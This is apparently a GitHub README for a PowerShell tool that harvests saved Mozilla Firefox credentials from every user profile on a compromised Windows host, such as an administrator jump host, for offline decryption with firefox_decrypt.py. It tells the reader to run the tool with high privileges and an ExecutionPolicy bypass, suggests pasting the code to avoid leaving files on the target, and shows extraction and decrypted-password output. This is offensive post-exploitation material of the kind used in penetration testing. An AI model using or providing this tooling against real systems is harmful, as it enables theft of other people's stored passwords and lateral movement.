# firefox_dump
When trying to gather additional credentials from lets say an Administrator Jump Host, extracting sensitive Mozilla Firefox files is a great approach. Doing this manually is boring and time consuming, especially if there are hundreds of users under `C:\Users`. 

To simplify this I've made a simple PowerShell script, [`firefox_dump.ps1`](https://raw.githubusercontent.com/0xPThree/firefox_dump/main/firefox_dump.ps1), that gathers all sensitive Mozilla Firefox information which can later be decrypted using [`firefox_decrypt.py`](https://github.com/unode/firefox_decrypt) or similar.

The script should be ran as a high privileged user to gain as much information as possible.

## Example Usage
```powershell
PS C:\tmp> powershell.exe -ExecutionPolicy Bypass .\firefox_dump.ps1
 ___    __   ___  ___  __       __              __
|__  | |__) |__  |__  /  \ \_/ |  \ |  |  |\/| |__)
|    | |  \ |___ |    \__/ / \ |__/ \__/  |  | |
                                      by: 0xPThree

[+] Extracting secrets from 'user1' to: C:\tmp\user1\ljftf853.default-release
[+] Extracting secrets from 'user1' to: C:\tmp\user1\skvrf23a.default
[+] Extracting secrets from 'user2' to: C:\tmp\user2\grg21h5s.default
[-] 'user3' doesn't have any saved passwords in Mozilla Firefox
```

If you don't want to upload files to the target host it's possible to simply copy-paste the try-catch code from the script and run it as is in PowerShell.

```bash
┌──(void㉿void)-[/opt/firefox_decrypt]
└─$ ./firefox_decrypt.py /tmp/firefox-loot/user1            

Website:   http://localhost:8000
Username: 'dev-user'
Password: 'D3velopm3ntM@st3rK3y*!'
```
